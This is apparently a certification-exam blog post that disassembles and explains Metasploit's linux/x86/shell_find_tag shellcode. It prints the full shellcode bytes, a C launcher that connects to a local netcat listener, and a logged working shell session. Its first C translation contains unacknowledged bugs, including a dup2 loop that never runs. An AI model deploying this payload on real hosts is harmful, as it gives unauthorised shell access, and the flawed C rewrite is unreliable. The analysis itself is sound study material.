---
title: "SLAE x86 Exam - Assignment #5 Part 3"
date: 2021-12-25
toc: true
search: false
classes: wide
categories:
  - blog
tags:
  - slae
  - assembly
  - nasm
  - c
  - exam
  - shellcode
  - metasploit
  - x86
---

## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

<https://www.pentesteracademy.com/course?id=3>

Student ID: PA-30398

## Foreword

The 5th assignment requires you to analyze at least 3 shellcode samples created using Msfpayload (nowadays `msfvenom`) for 32-bit Linux systems.

Programs like `gdb`/`ndisasm`/`libemu` can be used for dissecting the shellcode and performing the analysis.

I chose the following 4 shellcode samples:

Name | Description
-|-
linux/x86/adduser | Create a new user with UID 0
linux/x86/shell/reverse_nonx_tcp | Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_find_tag | Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp_ipv6 | Connect back to attacker and spawn a command shell over IPv6

In this post I'll analyse `linux/x86/shell_find_tag`.

## Source code

The full source code is stored inside the repository created for this Exam: [rbctee/SlaeExam](https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/5/part/3).

List of files:

- [mimick_shellcode.c](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/5/part/3/mimick_shellcode.c), a C program that I've written to imitate the instructions ran by the shellcode
- [run_shellcode.c](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/5/part/3/run_shellcode.c), a C program that runs the shellcode analysed in this post

## Analysis

### NDISASM

To generate the payload:

```bash
msfvenom -p linux/x86/shell_find_tag -o shellcode.bin
```

To analyse it with `ndisasm`:

```bash
ndisasm shellcode.bin -b 32 -p intel
```

It returns the following output (comments are mine though):

```nasm
                            ; clear EBX and push 0x00000000 to the stack
00000000  31DB              xor ebx,ebx
00000002  53                push ebx

                            ; store pointer to 0x00000000 into ESI
00000003  89E6              mov esi,esp

                            ; 4th argument of recv(): flags
                            ; push to the stack the value 0x00000040 (MSG_DONTWAIT)
00000005  6A40              push byte +0x40

                            ; 3rd argument of recv(): len, i.e. the number of bytes to
                            ;   read from the socket
                            ; push to the stack the value: 0x00000a00 (2560 bytes)
00000007  B70A              mov bh,0xa
00000009  53                push ebx

                            ; 2nd argument of recv(): buffer that will store the data
                            ; push to the stack the value: pointer to 0x00000000
0000000A  56                push esi

                            ; 1st argument of recv(): file descriptor of the socket
                            ; push to the stack the value: 0x00000a00
0000000B  53                push ebx

                            ; 3rd argument of socketcall()
                            ; store into ECX the pointer to its arguments
0000000C  89E1              mov ecx,esp

                            ; exchanges BH with BL, so 0x0a00 -> 0x000a
                            ; EBX = 0xa (SYS_RECV)
0000000E  86FB              xchg bh,bl

                            ; 0x0a00 -> 0x0a01
00000010  66FF01            inc word [ecx]

                            ; call socketcall() syscall, which in turn calls recv()
00000013  6A66              push byte +0x66
00000015  58                pop eax
00000016  CD80              int 0x80
```

```nasm
                            ; pointer to the buffer storing data received with recv()
                            ; check if the first bytes are the string "fjHh
00000018  813E666A4868      cmp dword [esi],0x68486a66
0000001E  75F0              jnz 0x10
```

{% sidenote If the first 4 bytes of the buffer of `recv()` aren't equal to the string `fjHh`, `recv()` is called with a file descriptor that **keeps increasing**  %}

```nasm
                            ; save the file descriptor of the socket into EDI and EBX
00000020  5F                pop edi
00000021  89FB              mov ebx,edi

                            ; set ECX ot 0x00000002
00000023  6A02              push byte +0x2
00000025  59                pop ecx

                            ; call dup2() syscall
00000026  6A3F              push byte +0x3f
00000028  58                pop eax
00000029  CD80              int 0x80

                            ; decrease ECX by 1 and jump to the address 00000026
0000002B  49                dec ecx
0000002C  79F8              jns 0x26
```

{% sidenote The last two instructions loop three times, from ECX=2 to ECX=0, in order to redirect respectively `stderr`, `stdout`, and `stdin` to the file descriptor of the socket %}

```nasm
                            ; set EAX to 0x0000000b
0000002E  6A0B              push byte +0xb
00000030  58                pop eax

                            ; 3rd argument of execve(): array of pointer to env. vars.
                            ; set EDX to 0 and push this value to the stack
                            ; it also acts as the string terminator of /bin//sh
00000031  99                cdq
00000032  52                push edx

                            ; push the following string to the stack: /bin//sh
00000033  682F2F7368        push dword 0x68732f2f
00000038  682F62696E        push dword 0x6e69622f

                            ; save the pointer to /bin//sh into EBX
0000003D  89E3              mov ebx,esp

                            ; push 0x00000000 to the stack
0000003F  52                push edx

                            ; 1st argument of execve(): path of the executable to run
                            ;   in this case: /bin//sh
00000040  53                push ebx

                            ; 2nd argument of execve():
                            ;   array of pointers to strings passed
                            ;   as the command-line arguments of /bin//sh
00000041  89E1              mov ecx,esp

                            ; call syscall 0xb (11): execve()
00000043  CD80              int 0x80
```

This last block of disassembly looks similar to what I've written for the 1st and 2nd assignments. It simply calls the syscall `execve` in order to spawn a shell, in particular `/bin//sh`.

To recap what the shellcode does:

1. the shellcode calls `recv` in order to receive data from the file descriptor `0xa00` (2560) of the socket
2. the shellcode checks the first 4 bytes of the buffer storing the data received
    1. if they aren't equal to `0x68486a66`, then it **increases** the file descriptor (`0xa00` -> `0xa01` -> `0xa02` ...), until `0xffff`, after that it starts again from `0x0000`
    2. if they are equal, it continues execution
3. the syscall `dup2` is used for redirecting standard error, standard output, and standard input (in this specific order) towards the file descriptor of the socket
4. the shellcode uses the syscall `execve` to spawn the shell `/bin/sh`

It translates to the following `C` program, although with some minor differences:

```cpp
#include <sys/socket.h>

void main(int argc, char *argv[])
{
    unsigned short int fd = 2560;

    /*
      buffer containing data received from the socket
      in the previous shellcode, the data is stored on the stack
      so this is the 1st difference
    */
    char buffer[2560] = {0};

    while (1)
    {
        recv(fd, &buffer, 2560, MSG_DONTWAIT);

        /*
          check the first four bytes of the data received from the socket (if so)
          I don't know how to check the first 4 bytes without other functions
          so this is the 2nd difference
        */
        if (buffer[0] == "\x66" && buffer[1] == "\x6a" && buffer[2] == "\x48" && buffer[3] == "\x68")
        {
            break;
        } else
        {
            // increase the file descriptor if data wasn't received or
            //  the first 4 bytes aren't correct
            fd++;
        }
    }

    // redirect stderr, stdout, stdin
    for (int i = 2; i <= 0; i++)
    {
        dup2(fd, i);
    }

    /*
      spawn a shell, using system(), as I couldn't use execve
      so this is the 3rd difference
    */
    system("/bin//sh", "/bin//sh", 0);
}
```

If you were to run the shellcode (or the program above) and pass it to `strace`, you would notice the function `recv` enters an endless loop, so it will never reach the function `dup2`.

To make it work, I wrote some C code that creates a socket and connects to a netcat listener, which sends the string `fjHh`:

```cpp
#include <sys/socket.h>
#include <netinet/ip.h>

void main(int argc, char *argv[])
{
    unsigned short int fd = 2560;
    char buffer[2560] = {0};

    // START block of code of code taken from assignment n.2

    int client_socket_fd;
    char *empty[] = { 0 };
    struct sockaddr_in client_address;

    client_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    client_address.sin_family = AF_INET;
    inet_aton("127.0.0.1", &client_address.sin_addr);
    client_address.sin_port = htons(4444);
    connect(client_socket_fd, (struct sockaddr *)&client_address, sizeof(client_address));

    // END block of code of code taken from assignment n.2

    printf("[+] Trying to find the correct file descriptor\n");
    while (1)
    {
        recv(fd, &buffer, 2560, MSG_DONTWAIT);
        if (buffer[0] == 102 && buffer[1] == 106 && buffer[2] == 72 && buffer[3] == 104)
        {
            printf("[+] Correct file descriptor: %d\n", fd);
            break;
        } else
        {
            fd++;
        }
    }

    printf("[+] Redirecting error, output, and input\n");
    for (int i = 2; i >= 0; i--)
    {
        dup2(fd, i);
    }

    printf("[+] Here's your shell:\n");
    system("/bin//sh", "/bin//sh\n", 0);
}
```

In another window, I set up the `netcat` listener:

```bash
nc -nlp 4444
# fjHh
```

I had to send the string before the C program could connect to it.

Next, compile and run and C program:

```bash
# compile
gcc -w ./file.c

# run
./a.out 
# [+] Trying to find the correct file descriptor
# [+] Correct file descriptor: 3
# [+] Redirecting error, output, and input
```

In the other window you should now have a **reverse shell**. Now that I've tested that it works corrrectly, I had to change it a bit, replacing some of the C code with the shellcode:

```cpp
#include <sys/socket.h>
#include <netinet/ip.h>

unsigned char code[] = \
"\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86"
"\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x66\x6a\x48\x68"
"\x75\xf0\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79"
"\xf8\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

void main(int argc, char *argv[])
{

    // START block of code of code taken from assignment n.2

    int client_socket_fd;
    char *empty[] = { 0 };
    struct sockaddr_in client_address;

    client_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    client_address.sin_family = AF_INET;
    inet_aton("127.0.0.1", &client_address.sin_addr);
    client_address.sin_port = htons(4444);
    connect(client_socket_fd, (struct sockaddr *)&client_address, sizeof(client_address));

    // END block of code of code taken from assignment n.2

    int (*ret)() = (int(*)())code;
    ret();
}
```

To compile it:

```bash
gcc -w -fno-stack-protector -z execstack file.c
```

It worked as expected, spawning a reverse shell in the other window, where I set up the netcat listener:

```bash
rbct@slae:~$ nc -nvl 4444
# fjHh
# Connection from 127.0.0.1 port 4444 [tcp/*] accepted
id
# uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
whoami
# rbct
exit
rbct@slae:~$ 
```

This type of shellcode would be used in cases where you've already set up a connection to a TCP socket, and you have control over it, so you're able to send the data desired, and most importantly the first 4 bytes specified in the shellcode.
